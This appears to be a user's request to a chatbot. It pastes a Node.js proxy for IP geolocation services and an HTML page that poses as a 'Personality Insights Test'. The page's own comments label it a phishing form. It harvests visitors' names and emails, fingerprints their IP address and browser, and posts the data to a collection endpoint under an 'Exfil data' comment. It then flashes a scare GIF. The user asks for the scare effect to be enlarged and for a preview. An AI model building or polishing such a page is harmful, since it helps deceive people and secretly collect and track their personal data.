const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();
const PORT = 4000;

// Enable CORS
app.use(cors());

// Proxy for ipapi.co
app.get('/ipapi/:ip/json', async (req, res) => {
  try {
    const response = await fetch(`https://ipapi.co/${req.params.ip}/json/`);
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('ipapi.co Error:', error);
    res.status(500).json({ error: 'ipapi.co failed' });
  }
});

// Proxy for ipgeolocation.io (requires API key)
app.get('/ipgeo', async (req, res) => {
  const { apiKey, ip } = req.query;
  if (!apiKey || !ip) {
    return res.status(400).json({ error: 'Missing API key or IP address' });
  }
  try {
    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`);
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('ipgeolocation.io Error:', error);
    res.status(500).json({ error: 'ipgeolocation.io failed' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
});

i wanna keep this for java and keep html <script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Personality Insights Test</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #2a5885, #50c9c3);
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .signup-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      width: 400px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      text-align: center;
    }

    .hidden {
      display: none !important;
    }

    .gif-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .gif-container img {
      width: 80vw;
      max-width: 800px;
    }

    h1 {
      font-size: 28px;
      color: #2a5885;
      margin-bottom: 15px;
    }

    p {
      font-size: 16px;
      line-height: 1.5;
      color: #555;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }

    button {
      padding: 12px 24px;
      background: #2a5885;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 500;
    }

    button:hover {
      background: #1e4066;
    }

    .note {
      font-size: 14px;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <!-- Main phishing form -->
  <div class="signup-container" id="signupForm">
    <h1>Personality Insights Test</h1>
    <p>Unlock your true self with our state-of-the-art Personality Insights Test. Powered by cutting-edge behavioral science, this test delivers highly accurate, personalized insights into your unique traits and strengths in just 10 minutes.</p>
    <form id="infoGrabber">
      <input type="text" name="name" placeholder="Full Name" required><br>
      <input type="email" name="email" placeholder="Email Address" required><br>
      <button type="submit">Start Survey</button>
      <p class="note">Your personalized results will be emailed to you upon completing the questionnaire.</p>
    </form>
  </div>

  <!-- Hidden payload (scare gif) -->
  <div class="gif-container hidden" id="skullGif">
    <img src="https://giffiles.alphacoders.com/120/120126.gif" alt="Scary Skull GIF">
  </div>

  <script>
    // Fingerprinting function
    async function gatherInfo() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const ip = (await res.json()).ip;
        return {
          ip,
          ua: navigator.userAgent,
          timestamp: new Date().toISOString()
        };
      } catch {
        return {
          ip: 'unknown',
          ua: navigator.userAgent,
          timestamp: new Date().toISOString()
        };
      }
    }

    // On form submit
    document.getElementById('infoGrabber').addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.target;
      const name = form.name.value;
      const email = form.email.value;
      const meta = await gatherInfo();

      // Exfil data
      await fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name,
          email,
          ip: meta.ip,
          userAgent: meta.ua,
          timestamp: meta.timestamp
        })
      });

      // Trigger shock payload
      document.getElementById('signupForm').classList.add('hidden');
      document.getElementById('skullGif').classList.remove('hidden');
    });
  </script>
</body>
</html>

although when they press the submit button make the screen dark and the gif slightly bigger. Let me know what you think of this and give me a preview